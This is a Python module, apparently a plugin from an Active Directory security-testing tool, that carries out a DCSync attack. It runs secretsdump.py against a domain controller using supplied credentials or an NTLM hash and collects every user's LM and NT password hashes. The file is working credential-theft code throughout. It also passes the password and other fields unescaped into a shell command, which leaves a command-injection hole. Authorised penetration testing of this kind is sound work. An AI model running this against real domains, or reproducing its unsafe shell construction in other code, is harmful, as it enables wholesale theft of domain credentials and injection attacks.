"""
DCSync Attack Module

Executes DCSync attack for obtaining credentials from Active Directory via replication
"""

import time
from typing import Dict, Any
from ....proto import DirectoryType, ScanOptions
from utils.async_subprocess import run_shell


class DCSyncAttack:
    """Executes DCSync attack"""
    
    def __init__(self, plugin_instance):
        self.plugin = plugin_instance
    
    async def execute(self, scan_options: ScanOptions, directory_type: DirectoryType) -> Dict[str, Any]:
        """
        Executes attack DCSync for obtaining credentials from Active Directory
        via replication of domain controller.
        
        Args:
            scan_options: Parameters for execution attack
            directory_type: Directory type
            
        Returns:
            Dict[str, Any]: Attack results, including user hashes
        """
        result = {
            "success": False,
            "domain_users": [],
            "errors": [],
            "statistics": {
                "total_users_found": 0,
                "total_hashes_obtained": 0,
                "execution_time": 0
            }
        }
        
        start_time = time.time()
        
        if not scan_options.domain_name:
            result["errors"].append("Domain name not specified")
            return result
        
        if not (scan_options.username and (scan_options.password or scan_options.ntlm_hash)):
            result["errors"].append("Credentials not specified")
            return result
        
        try:
            if directory_type != DirectoryType.ACTIVE_DIRECTORY:
                result["errors"].append("DCSync supported only for Active directory")
                return result
            
            try:
                cmd_parts = []
                cmd_parts.append("secretsdump.py")
                
                if scan_options.ntlm_hash:
                    cmd_parts.append(f"{scan_options.domain_name}/{scan_options.username}@{scan_options.ldap_server or scan_options.domain_name} -hashes :{scan_options.ntlm_hash}")
                else:
                    cmd_parts.append(f"{scan_options.domain_name}/{scan_options.username}:{scan_options.password}@{scan_options.ldap_server or scan_options.domain_name}")
                
                cmd_parts.append("-just-dc")
                cmd_parts.append("-outputfile -")
                
                cmd = " ".join(cmd_parts)
                
                rc, out, err = await run_shell(cmd, timeout=300, allow_unsafe_shell=True)
                
                if rc == 0:
                    user_hashes = []
                    for line in (out or "").strip().split("\n"):
                        if ":::" in line:
                            parts = line.split(":")
                            if len(parts) >= 4:
                                username = parts[0].strip()
                                rid = parts[1].strip() if len(parts) > 1 else None
                                lm_hash = parts[2].strip() if len(parts) > 2 else None
                                nt_hash = parts[3].strip() if len(parts) > 3 else None
                                
                                user_hashes.append({
                                    "username": username,
                                    "rid": rid,
                                    "lm_hash": lm_hash,
                                    "nt_hash": nt_hash
                                })
                    
                    result["domain_users"] = user_hashes
                    result["statistics"]["total_users_found"] = len(user_hashes)
                    result["statistics"]["total_hashes_obtained"] = len(user_hashes)
                    result["success"] = True
                else:
                    result["errors"].append(f"Error during execution DCSync: {err}")
            except Exception as e:
                result["errors"].append(f"Error during execution DCSync: {str(e)}")
        
        except Exception as e:
            result["errors"].append(f"General error: {str(e)}")
        
        result["statistics"]["execution_time"] = time.time() - start_time
        
        return result

